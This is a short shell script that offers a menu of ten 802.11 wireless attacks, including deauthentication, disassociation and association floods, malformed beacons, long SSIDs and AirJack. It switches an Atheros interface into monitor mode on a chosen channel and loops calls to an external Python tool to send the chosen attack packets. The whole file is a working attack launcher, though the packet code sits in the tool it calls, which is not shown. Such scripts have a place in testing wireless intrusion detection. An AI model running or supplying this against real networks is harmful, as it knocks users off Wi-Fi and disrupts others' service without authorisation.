#!/bin/sh
#~~~~~~~~~~~~~~~~~~~~P.S.Kiran Kundurthi~~~~~~~~~~~~~~~~~~~~~~~~
#~~~~~~~Script to generate various attacks~~~~~~~~~~~~~~~~~~~~~~~~

echo "Enter the attack Number in the following way:
      1.null probes
      2.Disassociation flood
      3.Association flood
      4.Invalid deauth
      5.Invalid Disassoc
      6.Long SSID
      7.AirJack
      8.Invalid Channel Beacon
      9.Windows Zero
      10.Deauth Flood - By default 100 packets will be sent
      Enter any number greater than 10 to Exit"
read m
	if [ $m -ge 1 -a $m -le 10 ] 
	then
		case $m in
		1) p="nullProbe";;
		2) p="disassociateFlood";;
		3) p="associateFlood";;
		4) p="invalidDeauthRcode";;
		5) p="invalidDisasRcode";;
		6) p="longSSID";;
		7) p="airJack";;
		8) p="invalidChannellBeacon";;
		9) p="windowsZero";;
		10) p="deauthFlood";;
		*) echo "Please choose the options carefully";;
		esac
echo "Enter the Number of packets to be sent:"
read n
echo "Channel Number:"
read c
echo "configuring the wireless interface"
wlanconfig ath0 destroy
sleep 2
wlanconfig ath0 create wlandev wifi0 wlanmode monitor
sleep 2
ifconfig ath0 up
sleep 2
iwconfig ath0 channel $c
sleep 3
echo "Interface Up"
for ((i=1;i<=n;i++))
do 
	python wve.py -i ath0 -m $p
	echo "Sent $i th Packet"
	done
fi

dialog --title "Attack" --backtitle "Information" --msgbox "We are done.Adios !!!" 9 50
	clear	



